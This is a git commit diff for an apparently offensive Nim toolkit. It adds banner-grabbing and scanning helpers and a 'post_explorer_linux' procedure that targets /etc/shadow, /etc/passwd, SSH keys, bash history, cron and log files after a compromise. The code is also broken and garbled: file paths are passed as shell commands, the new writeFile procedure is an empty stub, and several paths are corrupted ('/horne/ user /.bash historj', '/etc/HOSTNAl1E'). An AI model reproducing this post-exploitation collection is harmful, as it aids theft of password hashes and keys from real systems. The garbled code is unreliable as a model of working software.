3f2d783eb92d639f4cdfacd1e8fc0f5bfc3fe3f4
th3void <lnvoid@protonmail.com>
2021-04-13 11:10:57 -0300

    added proc to post exploration on linux, finished dns search proc

--- src/lollypop.nim
+++ src/lollypop.nim
@@ -1,15 +1,15 @@
 import osproc
 import strformat
 
-proc sys*(command: string; verbose: bool = false): bool = 
+proc sys*(command: string; verbose: bool = false): string = 
     try:
         var a = execCmdEx(command)
         if verbose == true:
             echo a[0]
-        return true
+        return "true"
     except:
-        echo "system_exec_command_error"
-        return false
+        echo "[ERROR_SYS_FUNTION]"
+        return "false"
 
 proc get_status*(val: bool): void = 
     if val == true:
@@ -17,27 +17,31 @@ proc get_status*(val: bool): void =
     else:
         echo "[:: ERROR :: ]"
 
+proc writeFile*(input: string): bool =
+
+    const PATH = "~/hackerman_outputs"
+
 proc helper*(): void = 
 
+    let init_script = "mkdir ~/hackerman_outputs"
     let get_my_ip = "curl ifconfig.me \n"
     let linux_alive = "ls -lct /etc | tail -1 | awk '{print $6, $7, $8}'"
 
 proc server*(option: string = "start"; host: string = "127.0.0.1"; port: string = "8000"; path: string = "./wordlist/dns.txt"): bool = 
     
     const PATH = "/opt/lampp/lampp"
-    var value = false
 
     if option == "start" or option == "":
-        value = sys(fmt("{PATH} {option}"))
+        discard sys(fmt("{PATH} {option}"))
 
     elif option == "stop" or option == "break":
-        value = sys(fmt("{PATH} {option}"))
+        discard sys(fmt("{PATH} {option}"))
 
     elif option == "restart" or option == "reboot":
-        value = sys(fmt("{PATH} {option}"))
+        discard sys(fmt("{PATH} {option}"))
 
     elif option == "php":
-        value = sys(fmt("php -S {host}:{port}"))
+        discard sys(fmt("php -S {host}:{port}"))
 
     else: 
         return false
@@ -60,11 +64,11 @@ proc dns*(host: string; ip: string; option: string): bool =
 
     elif option == "banner80" or option == "all":
         echo "[+] :: HTTP Banner grep at ~/outputs" 
-        discard sys(fmt"ncat -v #{host} 80 >> ~/banner_port_80_#{host}_.html", true)
+        discard sys(fmt"ncat -v #{host} 80 >> ~/hackerman_outputs/banner_port_80_#{host}_.html", true)
 
     elif option == "banner443" or option == "all":
         echo "[+] :: HTTPS Banner grep" 
-        discard sys(fmt"openssl s_client -quiet -connect #{ip}:443 >> ~/banner_port_443_#{$ip}_.html", true)
+        discard sys(fmt"openssl s_client -quiet -connect #{ip}:443 >> ~/hackerman_outputs/banner_port_443_#{$ip}_.html", true)
 
     elif option == "nikto" or option == "all":
         echo "[+] :: Nikto scanner" 
@@ -85,3 +89,62 @@ proc dns*(host: string; ip: string; option: string): bool =
         return false
     
     return true 
+
+proc post_explorer_linux*(write_output = false): bool = 
+
+    echo "[+] :: Local users hashes             " 
+    discard writeFile(sys("/etc/shadow"))
+
+    echo "[+] :: Local users                    " 
+    discard writeFile(sys("/etc/passwd"))
+
+    echo "[+] :: Local groups                   " 
+    discard writeFile(sys("/etc/group"))
+
+    echo "[+] :: Startup services               " 
+    discard writeFile(sys("/etc/rc.d"))
+
+    echo "[+] :: Service                        " 
+    discard writeFile(sys("/etc/init.d"))
+
+    echo "[+] :: Known hostnames and IPs        " 
+    discard writeFile(sys("/etc/hosts"))
+
+    echo "[+] :: Full hostnarne with domain     " 
+    discard writeFile(sys("/etc/HOSTNAl1E"))
+
+    echo "[+] :: Network configuration          " 
+    discard writeFile(sys("/etc/network/interfaces"))
+
+    echo "[+] :: System environment variables   " 
+    discard writeFile(sys("/etc/profile"))
+
+    echo "[+] :: Ubuntu sources list            " 
+    discard writeFile(sys("/etc/apt/sources.list"))
+
+    echo "[+] :: Narneserver configuration      " 
+    discard writeFile(sys("/etc/resolv.conf"))
+
+    echo "[+] :: Bash history (also /root/)     " 
+    discard writeFile(sys("/horne/ user /.bash historj"))
+
+    echo "[+] :: Vendor-mac  lookup             " 
+    discard writeFile(sys("/usr/share/wireshark/rnanuf"))
+
+    echo "[+] :: SSH keystore                   " 
+    discard writeFile(sys("-/.ssh/"))
+
+    echo "[+] :: System log files (most Linux)  " 
+    discard writeFile(sys("/var/log"))
+
+    echo "[+] :: System log files (Unix)        " 
+    discard writeFile(sys("/var/adrn"))
+
+    echo "[+] :: List cron files                " 
+    discard writeFile(sys("/var/spool/cron"))
+
+    echo "[+] :: Apache connection log          " 
+    discard writeFile(sys("/var/log/apache/access.log"))
+
+    echo "[+] :: Static file system info        " 
+    discard writeFile(sys("/etc/fstab"))
